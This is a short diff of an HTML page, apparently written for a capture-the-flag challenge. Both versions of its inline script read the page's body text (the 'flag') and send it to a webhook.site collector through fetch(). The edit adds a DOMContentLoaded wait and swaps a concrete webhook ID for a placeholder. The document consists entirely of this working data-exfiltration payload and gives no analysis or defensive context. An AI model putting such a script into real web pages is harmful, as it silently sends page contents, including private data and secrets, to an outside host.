@@ -7,8 +7,17 @@
 </head>
 <body>
     <script>
-        var flag = document.body.innerText; // Capture the body text
-        fetch("https://webhook.site/8dd7fec9-3dc2-4ba7-9a57-f8a3d38b7f7b?flag=" + encodeURIComponent(flag)); // Send it to webhook.site
+        // Wait for the DOM to fully load
+        document.addEventListener('DOMContentLoaded', function () {
+            // Change the selector based on where the flag is displayed
+            var flagElement = document.querySelector('body'); // or any specific selector that contains the flag
+            if (flagElement) {
+                var flag = flagElement.innerText || flagElement.textContent; // Capture the text
+                fetch("https://webhook.site/YOUR_UNIQUE_ID?flag=" + encodeURIComponent(flag)); // Send it to webhook.site
+            } else {
+                console.error('Flag element not found.');
+            }
+        });
     </script>
 </body>
 </html>
